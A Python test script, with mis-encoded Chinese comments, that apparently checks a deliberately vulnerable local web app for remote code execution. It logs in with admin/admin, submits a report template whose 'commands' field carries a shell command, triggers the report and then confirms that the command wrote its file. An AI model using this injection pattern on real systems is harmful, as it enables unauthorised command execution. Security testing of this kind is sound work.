#!/usr/bin/env python3
"""
ç®€å•çš„æ¼æ´æµ‹è¯•è„šæœ¬
ç”¨äºå¿«é€ŸéªŒè¯RCEæ¼æ´æ˜¯å¦ä¿®å¤æˆåŠŸ
"""

import requests
import json
import time
from urllib.parse import urljoin

def test_rce(target_url="http://localhost:8080"):
    """æµ‹è¯•RCEæ¼æ´"""
    print("="*50)
    print("RCE æ¼æ´å¿«é€Ÿæµ‹è¯•")
    print("="*50)
    
    session = requests.Session()
    
    # 1. ç™»å½•
    print("[1] å°è¯•ç™»å½•...")
    login_url = urljoin(target_url, '/login')
    login_data = {'username': 'admin', 'password': 'admin'}
    
    response = session.post(login_url, data=login_data, allow_redirects=False)
    if response.status_code != 302:
        print("[-] ç™»å½•å¤±è´¥")
        return False
    print("[+] ç™»å½•æˆåŠŸ")
    
    # 2. åˆ›å»ºæ¶æ„æŠ¥å‘Š
    print("[2] åˆ›å»ºæ¶æ„æŠ¥å‘Š...")
    create_url = urljoin(target_url, '/analytics/create')
    
    malicious_payload = {
        "data": {"type": "performance", "period": "test"},
        "template": {
            "template_type": "dynamic",
            "fields": ["cpu", "memory"],
            "commands": ["echo 'TEST_SUCCESS' > /app/static/test_result.txt"]
        }
    }
    
    form_data = {
        'title': 'æµ‹è¯•æŠ¥å‘Š',
        'description': 'æµ‹è¯•RCEæ¼æ´',
        'data': json.dumps(malicious_payload)
    }
    
    response = session.post(create_url, data=form_data)
    if response.status_code != 200:
        print("[-] åˆ›å»ºæŠ¥å‘Šå¤±è´¥")
        return False
    
    result = response.json()
    if 'id' not in result:
        print("[-] æŠ¥å‘Šåˆ›å»ºå¤±è´¥")
        return False
        
    report_id = result['id']
    print(f"[+] æŠ¥å‘Šåˆ›å»ºæˆåŠŸ (ID: {report_id})")
    
    # 3. è§¦å‘æ¼æ´
    print("[3] è§¦å‘æ¼æ´...")
    view_url = urljoin(target_url, f'/analytics/{report_id}')
    response = session.get(view_url)
    
    if response.status_code != 200:
        print("[-] è§¦å‘æ¼æ´å¤±è´¥")
        return False
    print("[+] æ¼æ´è§¦å‘æˆåŠŸ")
    
    # 4. éªŒè¯ç»“æœ
    print("[4] éªŒè¯å‘½ä»¤æ‰§è¡Œ...")
    time.sleep(3)
    
    test_url = urljoin(target_url, '/static/test_result.txt')
    response = session.get(test_url)
    
    if response.status_code == 200 and 'TEST_SUCCESS' in response.text:
        print("[+] RCE éªŒè¯æˆåŠŸï¼")
        print(f"[+] å‘½ä»¤æ‰§è¡Œç»“æœ: {response.text.strip()}")
        return True
    else:
        print("[-] RCE éªŒè¯å¤±è´¥")
        print(f"    çŠ¶æ€ç : {response.status_code}")
        if response.status_code == 200:
            print(f"    å“åº”å†…å®¹: {response.text[:100]}")
        return False

if __name__ == "__main__":
    import sys
    
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"
    
    success = test_rce(target)
    
    if success:
        print("\nğŸ‰ æµ‹è¯•é€šè¿‡ï¼šRCEæ¼æ´å·¥ä½œæ­£å¸¸ï¼")
        sys.exit(0)
    else:
        print("\nâŒ æµ‹è¯•å¤±è´¥ï¼šRCEæ¼æ´å¯èƒ½å­˜åœ¨é—®é¢˜")
        sys.exit(1) 